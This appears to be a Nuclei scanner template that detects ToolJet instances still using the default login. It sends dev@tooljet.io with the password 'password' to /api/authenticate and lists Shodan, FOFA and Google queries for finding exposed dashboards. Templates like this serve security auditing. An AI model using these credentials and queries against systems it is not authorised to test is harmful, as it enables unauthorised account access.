id: tooljet-default-login

info:
  name: ToolJet - Default Login
  author: random-robbie
  severity: high
  description: |
    ToolJet default login credentials were discovered.
  reference:
    - https://docs.tooljet.com/docs/contributing-guide/setup/docker/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:tooljet:tooljet:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: tooljet
    product: tooljet
    shodan-query:
      - http.title:"tooljet"
      - http.title:"tooljet - dashboard"
    fofa-query:
      - title="tooljet - dashboard"
      - title="tooljet"
    google-query:
      - intitle:"tooljet - dashboard"
      - intitle:"tooljet"
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)tooljet"})
  tags: default-login,tooljet

http:
  - raw:
      - |
        POST /api/authenticate HTTP/2
        Host: {{Hostname}}
        Content-Type: application/json

        {"email":"{{username}}","password":"{{password}}"}

    attack: pitchfork
    payloads:
      username:
        - dev@tooljet.io
      password:
        - password

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"auth_token":'
          - '"organization_id":'
        condition: and

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 201

